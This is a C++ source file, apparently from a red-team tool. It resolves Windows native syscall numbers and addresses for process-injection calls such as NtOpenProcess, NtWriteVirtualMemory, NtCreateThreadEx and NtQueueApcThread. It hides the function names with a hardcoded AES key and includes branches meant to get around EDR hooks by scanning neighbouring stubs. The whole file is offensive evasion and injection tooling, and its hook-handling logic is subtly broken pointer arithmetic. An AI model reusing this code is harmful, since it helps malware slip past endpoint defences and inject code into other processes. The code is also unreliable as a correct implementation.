/*
 * Copyright (c) 2026 JackTheRibber0 - https://github.com/JackTheRibber0
 * Licensed under the Apache License, Version 2.0
 *
 * LEGAL DISCLAIMER:
 * This C++ source code and the resulting binary are intended strictly for
 * educational purposes, academic research, and authorized Red Team operations.
 * The author assumes no liability for unauthorized or malicious use.
 */

#include "NtResolver.h"
#include "Miscellaneous.h"

using namespace resolver;

void NtResolver::fetchNativeAPIDLL(const LPCSTR moduleName)
{
	hNTDLL_ = GetModuleHandleA(moduleName);
	if (!hNTDLL_) return;
}

void NtResolver::resolveNativeAPICalls()
{
	const std::vector<uint8_t> iv(16, 0x02);
	const std::vector<uint8_t> key(32, 0x01);
	aes::Aes256Decryptor cipher(key, iv);

	if (!hNTDLL_)
	{
		size_t decryptedSize_DLL = 0;
		fetchNativeAPIDLL(cipher.decryptAsString(NDLL_, decryptedSize_DLL).c_str());
	}

	size_t decryptedSize_Close = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NClose_, decryptedSize_Close).c_str(), &NtCloseSSN, &NtCloseSyscall);

	size_t decryptedSize_OpenProc = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NOpenProc_, decryptedSize_OpenProc).c_str(), &NtOpenProcSSN, &NtOpenProcSyscall);

	size_t decryptedSize_CreateThread = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NCreateThread_, decryptedSize_CreateThread).c_str(), &NtCreateThreadExSSN, &NtCreateThreadExSyscall);

	size_t decryptedSize_WriteMem = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NWriteMem_, decryptedSize_WriteMem).c_str(), &NtWriteVirtualMemSSN, &NtWriteVirtualMemSyscall);

	size_t decryptedSize_WaitForSingleObj = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NWaitForSingleObj_, decryptedSize_WaitForSingleObj).c_str(), &NtWaitForSingleObjSSN, &NtWaitForSingleObjSyscall);

	size_t decryptedSize_AllocMem = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NAllocMem_, decryptedSize_AllocMem).c_str(), &NtAllocVirtualMemSSN, &NtAllocVirtualMemSysscall);

	size_t decryptedSize_NProtectMem = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NProtectMem_, decryptedSize_NProtectMem).c_str(), &NtProtectVirtualMemSSN, &NtProtectVirtualMemSyscall);

	size_t decryptedSize_QueueAPC = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NQueueApc_, decryptedSize_QueueAPC).c_str(), &NtQueueSSN, &NtQueueSyscall);

	size_t decryptedSize_QueryInfo = 0;
	staticResolveNAPICalls(cipher.decryptAsString(NQuerySystemInfo_, decryptedSize_QueryInfo).c_str(), &NtQuerrySystemInfoSSN, &NtQuerrySystemInfoSyscall);
}

void NtResolver::staticResolveNAPICalls(const LPCSTR ntFuncName, DWORD* ssn, UINT_PTR* callPtr)
{
	UINT_PTR tempProcAddress = reinterpret_cast<UINT_PTR>(GetProcAddress(hNTDLL_, ntFuncName));
	if (!tempProcAddress) return;

	const auto* tempMemRegion = reinterpret_cast<uint8_t*>(tempProcAddress);

	const int up = 32;
	const int down = -32;

	if (*(tempMemRegion) == 0x4C 
		&& *(tempMemRegion + 1) == 0x8B
		&& *(tempMemRegion + 2) == 0xD1
		&& *(tempMemRegion + 3) == 0xB8
		&& *(tempMemRegion + 6) == 0x00
		&& *(tempMemRegion + 7) == 0x00)
	{
		BYTE high = *(tempMemRegion + 5);
		BYTE low = *(tempMemRegion + 4);
		*ssn = (high << 8) | low;

		for (size_t funOffset = 0; funOffset < 32; ++funOffset)
		{
			if (*(tempMemRegion + funOffset) == 0x0F && *(tempMemRegion + funOffset + 1) == 0x05)
			{
				*callPtr = tempProcAddress + funOffset;
				break;
			}
		}
	}
	//
	//	CASE THE FUNCTION IS HOOKED BY EDR
	//
	else if (*(tempMemRegion) == 0xE9)
	{
		for (size_t offset = 1; offset <= 500; ++offset)
		{
			if (*(tempMemRegion) + offset * down == 0x4C
				&& *(tempMemRegion) + 1 + offset * down == 0x8B
				&& *(tempMemRegion) + 2 + offset * down == 0xD1
				&& *(tempMemRegion) + 3 + offset * down == 0xB8
				&& *(tempMemRegion) + 6 + offset * down == 0x00
				&& *(tempMemRegion) + 7 + offset * down == 0x00)
			{
				BYTE high = *(tempMemRegion) + 5 + offset * down;
				BYTE low = *(tempMemRegion) + 4 + offset * down;
				*ssn = (high << 8) | low - offset;

				for (size_t funOffset = 0; funOffset < 32; ++funOffset)
				{
					if (*(tempMemRegion + funOffset) == 0x0F && *(tempMemRegion + funOffset + 1) == 0x05)
					{
						*callPtr = tempProcAddress + funOffset;
						break;
					}
				}

				break;
			}

			else if (*(tempMemRegion) + offset * up == 0x4C
				&& *(tempMemRegion) + 1 + offset * up == 0x8B
				&& *(tempMemRegion) + 2 + offset * up == 0xD1
				&& *(tempMemRegion) + 3 + offset * up == 0xB8
				&& *(tempMemRegion) + 6 + offset * up == 0x00
				&& *(tempMemRegion) + 7 + offset * up == 0x00)
			{
				BYTE high = *(tempMemRegion) + 5 + offset * up;
				BYTE low = *(tempMemRegion) + 4 + offset * up;
				*ssn = (high << 8) | low - offset;

				for (size_t funOffset = 0; funOffset < 32; ++funOffset)
				{
					if (*(tempMemRegion + funOffset) == 0x0F && *(tempMemRegion + funOffset + 1) == 0x05)
					{
						*callPtr = tempProcAddress + funOffset;
						break;
					}
				}

				break;
			}
		}
	}

	else if (*(tempMemRegion + 3) == 0xE9)
	{
		for (size_t offset = 1; offset <= 500; ++offset)
		{
			if (*(tempMemRegion) + offset * down == 0x4C
				&& *(tempMemRegion) + 1 + offset * down == 0x8B
				&& *(tempMemRegion) + 2 + offset * down == 0xD1
				&& *(tempMemRegion) + 3 + offset * down == 0xB8
				&& *(tempMemRegion) + 6 + offset * down == 0x00
				&& *(tempMemRegion) + 7 + offset * down == 0x00)
			{
				BYTE high = *(tempMemRegion) + 5 + offset * down;
				BYTE low = *(tempMemRegion) + 4 + offset * down;
				*ssn = (high << 8) | low - offset;

				for (size_t funOffset = 0; funOffset < 32; ++funOffset)
				{
					if (*(tempMemRegion + funOffset) == 0x0F && *(tempMemRegion + funOffset + 1) == 0x05)
					{
						*callPtr = tempProcAddress + funOffset;
						break;
					}
				}

				break;
			}

			else if (*(tempMemRegion)+offset * up == 0x4C
				&& *(tempMemRegion) + 1 + offset * up == 0x8B
				&& *(tempMemRegion) + 2 + offset * up == 0xD1
				&& *(tempMemRegion) + 3 + offset * up == 0xB8
				&& *(tempMemRegion) + 6 + offset * up == 0x00
				&& *(tempMemRegion) + 7 + offset * up == 0x00)
			{
				BYTE high = *(tempMemRegion) + 5 + offset * up;
				BYTE low = *(tempMemRegion) + 4 + offset * up;
				*ssn = (high << 8) | low - offset;

				for (size_t funOffset = 0; funOffset < 32; ++funOffset)
				{
					if (*(tempMemRegion + funOffset) == 0x0F && *(tempMemRegion + funOffset + 1) == 0x05)
					{
						*callPtr = tempProcAddress + funOffset;
						break;
					}
				}

				break;
			}
		}
	}

	Logger::getInstance().logf("NtResolver::staticResolveNAPICalls: resolved function.\nName: {}.\nSSN: {}.\nAddress: {}.\n", ntFuncName, *ssn, *callPtr);
}